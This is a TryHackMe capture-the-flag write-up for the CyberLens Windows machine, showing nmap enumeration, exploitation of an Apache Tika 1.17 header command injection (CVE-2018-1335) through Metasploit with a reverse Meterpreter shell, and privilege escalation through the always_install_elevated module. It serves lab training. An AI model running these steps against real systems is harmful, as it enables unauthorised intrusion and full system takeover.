# Cyber-Lens - Try Hack Me
CyberLens is an Easy-level Windows CTF machine on TryHackMe designed to help learners practice real-world penetration testing techniques. The objective is to exploit a vulnerable web server, gain initial access to the target system, escalate privileges, and capture the hidden flags.

# Overview

CyberLens is a Windows-based TryHackMe machine focused on web application enumeration, vulnerability identification, exploitation, and privilege assessment. During this engagement, an exposed Apache Tika service was identified on a non-standard port. The service was vulnerable to Apache Tika Header Command Injection, allowing remote code execution and initial access to the target system.

# Lab Information
Field	Value
Platform	TryHackMe
Machine Name	CyberLens
Difficulty	Easy
Operating System	Windows
Objective	Capture User Flag & Root Flag

Reconnaissance 
• Enumeration : Scan ports With nmap. As usual, the first step is to identify points of connection with our target systems: open ports. Normally, we can do this with NMAP or Nikto, whereas Metasploit provides the same ability out of the box.

At the beginning, we need to define Remote Hosts (RHOSTS). This will identify the target IP for the NMAP module:
	
	CMD : nmap -sV <IP>

  <img width="779" height="216" alt="image" src="https://github.com/user-attachments/assets/c9287811-92c1-485b-9618-87009be58505" />

	
These ports are open.
	
• Enumerate all PORT : see 61777 port service … which basically shows that we overlooked one important port: 61777. This was due to the high number of the port. Let’s scan it as well using the -p flag.
	
	CMD : nmap -p61777 -sV <IP>

  <img width="1219" height="421" alt="image" src="https://github.com/user-attachments/assets/2de728b8-8b29-4a5b-ad67-7f2e4c4c9e73" />

	
This Service is Run 
	
• Check on Browser this Port :
	
<img width="1031" height="733" alt="image" src="https://github.com/user-attachments/assets/8b04a40f-73cb-47f1-8aca-0259bfeeeb04" />

	
• Check this Service version Exploit available or not : Search on Browser We found an Apache Tika 1.17 server with CVE-2018–1335 (Remote Code Execution).
	
<img width="1167" height="781" alt="image" src="https://github.com/user-attachments/assets/522f6e92-3708-4d16-97aa-0d36bb116365" />

  
Vulnerability = Header Command Injection [+]
Available on Rapid7 it mean Exploit Available on metasploit 

However, if we look to the options of the exploit, we have to tune several parameters:

RPORT: we are using custom port 61777
LHOST: IP of listener. Normally, it has to be our IP.
I configured corresponding settings using set command.

Press enter or click to view image in full size

	
• Open Meta-sploit : 

	CMD : msfconsole 
	Search tika 
  <img width="1612" height="42" alt="image" src="https://github.com/user-attachments/assets/99b33368-ae06-42af-beba-315e9c0f36a4" />

	
	Use 0
	Show options
	Set rhosts <IP>
	Set  rport 61777
	Set lhost tun0
	Exploit
	[+]
	[+]
	Meterpreter>
	Getuid
	
	
Check desktop Folder you get USER.TXT
	
• Background this session = CTRL + Z
	
USER.TXT--------------------------------------------------------FLAG{}--------------------------------------------------------------



# Privilege Escalation 

Of course, this is not enough for us, and we need the root (administrator) flag. Let’s keep our machine hacked by putting it in the background using the background command:


… and look for something like Windows Privilege Escalation Awesome Scripts (WinPEAS). But again, no need to download anything since his kind of scripts are also available by default as Exploit Suggester.

• Start Privilege Escalation : Using POST module 
	
• Post Module : post/multi/recon/local_exploit_suggester
	
	CMD : use post/multi/recon/local_exploit_suggester
	Show options
	Set session 1
	Exploit 
	[+]
	[+]

<img width="1594" height="631" alt="image" src="https://github.com/user-attachments/assets/0bd85630-25cd-475c-bcc7-64477cecce0f" />




LIST OF EXPLOIT TO ESCALATE THIS.
	
	Use exploit/windows/local/always_install_elevated
	Show options
	Set session 1 
	Set lhost tun0
	Set lport 4445
	Exploit
	[+]
	[+]
	Meterpreter>
	Getuid

  <img width="484" height="112" alt="image" src="https://github.com/user-attachments/assets/b8a47e60-3dbc-4638-8691-429f08820902" />

	
	
ACCESS GRANTED = Local System User
	
<img width="1095" height="321" alt="image" src="https://github.com/user-attachments/assets/af19b23b-37bc-4544-9a3f-ba9077bb5ece" />

	
ROOT.TXT---------------------------------------------------------------FLAG{}---------------------------------------------------------


And Congrats, you have rooted the machine i guess!

bye bye!
